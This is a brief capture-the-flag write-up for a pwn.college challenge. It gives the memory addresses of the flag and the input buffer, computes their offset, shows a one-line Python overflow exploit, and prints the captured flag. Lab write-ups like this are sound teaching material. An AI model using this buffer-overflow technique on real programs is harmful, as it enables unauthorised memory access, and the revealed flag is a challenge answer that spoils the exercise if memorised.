In this challenge the input buffer and the flags are mapped into the virtual memory

I used cutter to debug the program to get address of all the regions mapped

The flag is written at 0x7ff8a73bd000
The input buffer is at 0x7ff8a73b9000

The offset is 16384

The exploit
    
    python -c 'import sys, time; sys.stdout.buffer.write(b"28672"); time.sleep(1); sys.stdout.buffer.write(b"A"*16385);'

The flag 

    pwn.college{YtrWlaDifxfwsTZtUdHDUUakuC_.0FMxMDL5kzM1czW}
